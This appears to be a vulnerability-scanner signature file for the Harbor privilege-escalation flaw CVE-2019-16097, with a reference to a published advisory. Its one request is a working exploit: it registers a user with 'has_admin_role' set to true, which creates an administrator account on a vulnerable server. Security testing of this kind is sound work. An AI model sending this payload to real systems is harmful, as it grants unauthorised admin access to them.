# info to search signature
id: harbor-cve-01
info:
  name: Harbor privilege-escalation CVE-2019-16097
  risk: High

params:
  - user: sam11
  - pass: password1

requests:
  - method: POST
    redirect: true
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - Content-Type: "application/json"
    url: >-
     {{.BaseURL}}/api/users/
    body: '{"email":"{{.user}}@gmail.com","has_admin_role":true,"password":"{{.pass}}","realname":"xxx","username":"{{.user}}"}'
    detections:
      - >-
        (StatusCode() == 204 || StatusCode() == 201) && StringSearch("response", "/api/users/")
      - >-
        StringSearch("response", "username has already")

reference:
  - link: https://nsfocusglobal.com/harbor-remote-privilege-escalation-vulnerability-cve-2019-16097-threat-alert/